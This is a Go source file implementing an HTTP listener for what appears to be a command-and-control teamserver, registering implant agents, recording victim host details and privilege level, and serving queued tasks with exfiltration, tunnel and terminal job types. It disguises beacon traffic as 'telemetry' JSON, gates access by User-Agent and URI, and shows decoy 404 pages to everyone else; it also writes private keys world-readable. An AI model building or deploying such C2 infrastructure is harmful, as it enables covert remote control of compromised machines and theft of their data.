package main

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/vmihailenco/msgpack/v5"
)

type Listener struct {
	transport *TransportHTTP
}

type TransportHTTP struct {
	GinEngine *gin.Engine
	Server    *http.Server
	Config    TransportConfig
	Name      string
	Active    bool
}

type TransportConfig struct {
	HostBind           string `json:"host_bind"`
	PortBind           int    `json:"port_bind"`
	Callback_addresses string `json:"callback_addresses"`
	EncryptKey         string `json:"encrypt_key"`

	Ssl         bool   `json:"ssl"`
	SslCert     []byte `json:"ssl_cert"`
	SslKey      []byte `json:"ssl_key"`
	SslCertPath string `json:"ssl_cert_path"`
	SslKeyPath  string `json:"ssl_key_path"`

	// Agent
	HttpMethod     string `json:"http_method"`
	Uri            string `json:"uri"`
	ParameterName  string `json:"hb_header"`
	UserAgent      string `json:"user_agent"`
	HostHeader     string `json:"host_header"`
	RequestHeaders string `json:"request_headers"`
	Sleep          int    `json:"sleep"`
	Jitter         int    `json:"jitter"`

	// Server
	ResponseHeaders    map[string]string `json:"response_headers"`
	TrustXForwardedFor bool              `json:"x-forwarded-for"`
	WebPageError       string            `json:"page-error"`
	WebPageOutput      string            `json:"page-payload"`

	Server_headers string `json:"server_headers"`
	Protocol       string `json:"protocol"`
}

// JSON Wrapper for Traffic Shaping
type TelemetryPacket struct {
	Timestamp int64  `json:"timestamp"`
	Status    string `json:"status"`
	Payload   string `json:"trace_id"`
}

// Gopher Protocol Constants
const (
	INIT_PACK    = 1
	EXFIL_PACK   = 2
	JOB_PACK     = 3
	JOB_TUNNEL   = 4
	JOB_TERMINAL = 5
)

// Gopher Protocol Structs
type StartMsg struct {
	Type int    `msgpack:"id"`
	Data []byte `msgpack:"data"`
}

type InitPack struct {
	Id   uint   `msgpack:"id"`
	Type uint   `msgpack:"type"`
	Data []byte `msgpack:"data"`
}

type SessionInfo struct {
	Process    string `msgpack:"process"`
	PID        int    `msgpack:"pid"`
	User       string `msgpack:"user"`
	Host       string `msgpack:"host"`
	Ipaddr     string `msgpack:"ipaddr"`
	Elevated   bool   `msgpack:"elevated"`
	Acp        uint32 `msgpack:"acp"`
	Oem        uint32 `msgpack:"oem"`
	Os         string `msgpack:"os"`
	OSVersion  string `msgpack:"os_version"`
	EncryptKey []byte `msgpack:"encrypt_key"`
}

// AES Decryption
func DecryptData(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := data[:nonceSize], data[nonceSize:]

	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}
	return plaintext, nil
}

func validConfig(config string) error {
	var conf TransportConfig
	err := json.Unmarshal([]byte(config), &conf)
	if err != nil {
		return err
	}

	if conf.HostBind == "" {
		return errors.New("HostBind is required")
	}

	if conf.PortBind < 1 || conf.PortBind > 65535 {
		return errors.New("PortBind must be in the range 1-65535")
	}

	if conf.Callback_addresses == "" {
		return errors.New("callback_servers is required")
	}
	lines := strings.Split(strings.TrimSpace(conf.Callback_addresses), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		host, portStr, err := net.SplitHostPort(line)
		if err != nil {
			return fmt.Errorf("Invalid address (cannot split host:port): %s\n", line)
		}

		port, err := strconv.Atoi(portStr)
		if err != nil || port < 1 || port > 65535 {
			return fmt.Errorf("Invalid port: %s\n", line)
		}

		ip := net.ParseIP(host)
		if ip == nil {
			if len(host) == 0 || len(host) > 253 {
				return fmt.Errorf("Invalid host: %s\n", line)
			}
		}
	}

	matched, err := regexp.MatchString(`^/[a-zA-Z0-9\.\=\-]+(/[a-zA-Z0-9\.\=\-]+)*$`, conf.Uri)
	if err != nil || !matched {
		return errors.New("uri invalid")
	}

	if conf.HttpMethod == "" {
		return errors.New("http_method is required")
	}

	match, _ := regexp.MatchString("^[0-9a-f]{32}$", conf.EncryptKey)
	if len(conf.EncryptKey) != 32 || !match {
		return errors.New("encrypt_key must be 32 hex characters")
	}

	return nil
}

func (t *TransportHTTP) Start(ts Teamserver) error {
	fmt.Printf("[DEBUG] GopherHTTP Listener Starting on %s:%d\n", t.Config.HostBind, t.Config.PortBind)
	var err error = nil

	gin.SetMode(gin.DebugMode) // Change to DebugMode to see Gin logs
	router := gin.New()
	// router.NoRoute(t.pageError) // Temporarily disable custom 404 to see Gin's default behavior

	router.Use(func(c *gin.Context) {
		fmt.Printf("[DEBUG] Middleware: Request %s %s\n", c.Request.Method, c.Request.URL.Path)
		for header, value := range t.Config.ResponseHeaders {
			c.Header(header, value)
		}
		c.Next()
	})

	router.POST("/*endpoint", t.processRequest)
	// Also support GET if configured, but POST is required for data
	if t.Config.HttpMethod == "GET" {
		router.GET("/*endpoint", t.processRequest)
	}

	t.Active = true

	t.Server = &http.Server{
		Addr:    fmt.Sprintf("%s:%d", t.Config.HostBind, t.Config.PortBind),
		Handler: router,
	}

	if t.Config.Ssl {
		fmt.Printf("   Started Gopher listener '%s': https://%s:%d\n", t.Name, t.Config.HostBind, t.Config.PortBind)

		listenerPath := ListenerDataDir + "/" + t.Name
		_, err = os.Stat(listenerPath)
		if os.IsNotExist(err) {
			err = os.Mkdir(listenerPath, os.ModePerm)
			if err != nil {
				return fmt.Errorf("failed to create %s folder: %s", listenerPath, err.Error())
			}
		}

		t.Config.SslCertPath = listenerPath + "/listener.crt"
		t.Config.SslKeyPath = listenerPath + "/listener.key"

		if len(t.Config.SslCert) == 0 || len(t.Config.SslKey) == 0 {
			err = t.generateSelfSignedCert(t.Config.SslCertPath, t.Config.SslKeyPath)
			if err != nil {
				t.Active = false
				fmt.Println("Error generating self-signed certificate:", err)
				return err
			}
		} else {
			err = os.WriteFile(t.Config.SslCertPath, t.Config.SslCert, 0600)
			if err != nil {
				return err
			}
			err = os.WriteFile(t.Config.SslKeyPath, t.Config.SslKey, 0600)
			if err != nil {
				return err
			}
		}

		cert, err := tls.LoadX509KeyPair(t.Config.SslCertPath, t.Config.SslKeyPath)
		if err != nil {
			t.Active = false
			return fmt.Errorf("failed to load certificate: %v", err)
		}

		t.Server.TLSConfig = &tls.Config{
			Certificates: []tls.Certificate{cert},
			MinVersion:   tls.VersionTLS10,
		}

		go func() {
			err = t.Server.ListenAndServeTLS("", "")
			if err != nil && !errors.Is(err, http.ErrServerClosed) {
				fmt.Printf("Error starting HTTPS server: %v\n", err)
				return
			}
			t.Active = true
		}()

	} else {
		fmt.Printf("   Started Gopher listener '%s': http://%s:%d\n", t.Name, t.Config.HostBind, t.Config.PortBind)

		go func() {
			err = t.Server.ListenAndServe()
			if err != nil && !errors.Is(err, http.ErrServerClosed) {
				fmt.Printf("Error starting HTTP server: %v\n", err)
				return
			}
			t.Active = true
		}()
	}

	time.Sleep(500 * time.Millisecond)
	return err
}

func (t *TransportHTTP) Stop() error {
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	return t.Server.Shutdown(ctx)
}

func (t *TransportHTTP) processRequest(ctx *gin.Context) {
	var packet TelemetryPacket

	// 1. Validations
	valid := false
	u, err := url.Parse(ctx.Request.RequestURI)
	if err == nil {
		if t.Config.Uri == u.Path {
			valid = true
		}
	}
	if !valid {
		t.pageError(ctx)
		return
	}

	if t.Config.UserAgent != ctx.Request.UserAgent() {
		t.pageError(ctx)
		return
	}

	// 2. Parse JSON
	if err := ctx.BindJSON(&packet); err != nil {
		t.pageError(ctx)
		return
	}

	// 3. Decode Payload
	encryptedBytes, err := hex.DecodeString(packet.Payload)
	if err != nil {
		t.pageError(ctx)
		return
	}

	// Check if known agent (Session Key) via Encrypted Header
	headerVal := ctx.GetHeader(t.Config.ParameterName)
	if headerVal != "" {
		// Try to decrypt header
		headerBytes, err := base64.StdEncoding.DecodeString(headerVal)
		if err == nil {
			// Decrypt with Listener Key
			lKey, err := hex.DecodeString(t.Config.EncryptKey)
			if err == nil {
				decId, err := DecryptData(headerBytes, lKey)
				if err == nil && len(decId) == 4 {
					agentIdNum := binary.BigEndian.Uint32(decId)
					agentId := fmt.Sprintf("%08x", agentIdNum)

					if Ts.TsAgentIsExists(agentId) {
						// Forward to Core (Core uses Session Key)
						err = Ts.TsAgentProcessData(agentId, encryptedBytes)

						// GET TASKS
						tasksData, _ := Ts.TsAgentGetHostedAll(agentId, 2097152)
						respPayload := ""
						if len(tasksData) > 0 {
							respPayload = hex.EncodeToString(tasksData)
						}

						// Respond OK with Tasks
						ctx.JSON(200, TelemetryPacket{
							Timestamp: time.Now().Unix(),
							Status:    "active",
							Payload:   respPayload,
						})
						return
					}
				}
			}
		}
	}

	// 4. Decrypt (Listener Key - Init Packet)
	encKey, err := hex.DecodeString(t.Config.EncryptKey)
	if err != nil {
		t.pageError(ctx)
		return
	}

	decryptedData, err := DecryptData(encryptedBytes, encKey)
	if err != nil {
		t.pageError(ctx)
		return
	}

	// 5. Unmarshal MsgPack
	var msg StartMsg
	err = msgpack.Unmarshal(decryptedData, &msg)
	if err != nil {
		t.pageError(ctx)
		return
	}

	// 6. Handle Init or Data
	if msg.Type == INIT_PACK {
		var init InitPack
		err = msgpack.Unmarshal(msg.Data, &init)
		if err != nil {
			t.pageError(ctx)
			return
		}

		agentIdHex := fmt.Sprintf("%08x", init.Id)
		agentTypeHex := fmt.Sprintf("%08x", init.Type)
		externalIP := ctx.ClientIP()

		if !Ts.TsAgentIsExists(agentIdHex) {
			_, err = Ts.TsAgentCreate(agentTypeHex, agentIdHex, init.Data, t.Name, externalIP, true)
			if err != nil {
				t.pageError(ctx)
				return
			}
		}
		_ = Ts.TsAgentSetTick(agentIdHex, t.Name)

		// Return tasks if any
		tasksData, _ := Ts.TsAgentGetHostedAll(agentIdHex, 2097152)
		respPayload := ""
		if len(tasksData) > 0 {
			respPayload = hex.EncodeToString(tasksData)
		}

		ctx.JSON(200, TelemetryPacket{
			Timestamp: time.Now().Unix(),
			Status:    "active",
			Payload:   respPayload,
		})
		return
	}

	ctx.JSON(200, gin.H{
		"status": "ok",
		"ts":     time.Now().Unix(),
	})
}

func (t *TransportHTTP) generateSelfSignedCert(certFile, keyFile string) error {
	var (
		certData   []byte
		keyData    []byte
		certBuffer bytes.Buffer
		keyBuffer  bytes.Buffer
		privateKey *rsa.PrivateKey
		err        error
	)

	privateKey, err = rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return fmt.Errorf("failed to generate private key: %v", err)
	}

	serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
	serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
	if err != nil {
		return fmt.Errorf("failed to generate serial number: %v", err)
	}

	template := x509.Certificate{
		SerialNumber: serialNumber,
		NotBefore:    time.Now(),
		NotAfter:     time.Now().Add(365 * 24 * time.Hour),

		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	hostBind := strings.TrimSpace(t.Config.HostBind)
	if hostBind == "" || hostBind == "0.0.0.0" || hostBind == "::" {
		template.DNSNames = []string{"localhost"}
		template.IPAddresses = []net.IP{net.ParseIP("127.0.0.1"), net.ParseIP("::1")}
	} else if ip := net.ParseIP(hostBind); ip != nil {
		template.IPAddresses = []net.IP{ip}
	} else {
		template.DNSNames = []string{hostBind}
	}

	certData, err = x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
	if err != nil {
		return fmt.Errorf("failed to create certificate: %v", err)
	}

	err = pem.Encode(&certBuffer, &pem.Block{Type: "CERTIFICATE", Bytes: certData})
	if err != nil {
		return fmt.Errorf("failed to write certificate: %v", err)
	}

	t.Config.SslCert = certBuffer.Bytes()
	err = os.WriteFile(certFile, t.Config.SslCert, 0644)
	if err != nil {
		return fmt.Errorf("failed to create certificate file: %v", err)
	}

	keyData = x509.MarshalPKCS1PrivateKey(privateKey)
	err = pem.Encode(&keyBuffer, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: keyData})
	if err != nil {
		return fmt.Errorf("failed to write private key: %v", err)
	}

	t.Config.SslKey = keyBuffer.Bytes()
	err = os.WriteFile(keyFile, t.Config.SslKey, 0644)
	if err != nil {
		return fmt.Errorf("failed to create key file: %v", err)
	}

	return nil
}

func (t *TransportHTTP) pageError(ctx *gin.Context) {
	ctx.Writer.WriteHeader(http.StatusNotFound)
	html := []byte(t.Config.WebPageError)
	_, _ = ctx.Writer.Write(html)
}
